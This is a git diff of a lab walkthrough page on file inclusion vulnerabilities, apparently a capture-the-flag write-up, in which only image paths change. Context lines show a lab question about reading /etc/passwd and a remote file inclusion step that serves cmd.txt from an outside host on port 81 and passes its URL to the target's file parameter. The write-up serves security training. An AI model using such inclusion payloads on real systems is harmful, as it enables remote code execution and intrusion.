@@ -6,7 +6,7 @@
 
 **Give Lab #1 a try to read /etc/passwd. What would the request URI be?**
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 **In Lab #2, what is the directory specified in the include function?**
 
@@ -108,4 +108,4 @@ python2 -m SimpleHTTPServer 81
 hxxp://10.10.230.14/playground.php?file=http://10.10.11.193:81/cmd.txt
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
